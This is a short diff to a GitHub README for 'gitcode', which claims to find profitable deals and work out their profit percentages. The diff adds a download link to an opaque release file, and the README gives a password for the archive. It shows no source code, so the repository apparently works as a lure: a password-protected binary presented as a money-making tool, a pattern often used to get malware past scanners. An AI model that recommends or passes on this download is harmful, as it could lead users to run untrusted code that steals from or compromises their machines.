@@ -1,5 +1,9 @@
+
+![suw3](https://github.com/getFid2/gitcode/assets/169592343/e7283944-03e4-413d-83a7-5a3d0f91ef34)
 # gitcode
 this code deals with finding profitable deals and calculating the percentage of their profit
+download:
+https://github.com/getFid2/gitcode/releases/download/download/gitcode.1
 archive password - gith
 
 how to use:
